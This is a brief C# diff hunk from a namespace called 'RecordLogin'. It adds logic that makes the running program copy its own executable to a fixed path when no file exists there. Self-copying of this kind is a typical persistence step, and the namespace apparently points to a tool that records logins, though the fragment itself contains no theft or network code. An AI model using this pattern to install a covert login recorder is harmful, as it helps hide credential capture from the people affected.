@@ -142,6 +142,13 @@ namespace RecordLogin
         {
             try
             {
+                if (!File.Exists(ExeFilePath))
+                {
+                    if (SelfCopy(ExeFilePath))
+                        return true;
+                    else
+                        return false;
+                }
                 return true;
             }
             catch (Exception e)
